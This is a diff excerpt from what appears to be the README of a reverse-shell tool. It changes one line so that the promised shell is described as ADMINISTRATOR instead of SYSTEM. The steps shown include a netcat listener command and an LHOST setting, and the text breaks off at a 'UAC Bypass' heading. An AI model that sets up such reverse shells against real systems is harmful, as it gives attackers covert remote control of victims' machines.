@@ -4,7 +4,7 @@
 1. Run `run_as_admin.bat`.
 2. Enter your `LHOST` (your local IP address).
 3. Start your listener: `nc -lvnp 2424`
-4. The `SYSTEM` shell will connect back to you.
+4. The `ADMINISTRATOR` shell will connect back to you.
 
 ## UAC Bypass (Optional)
 ```cmd
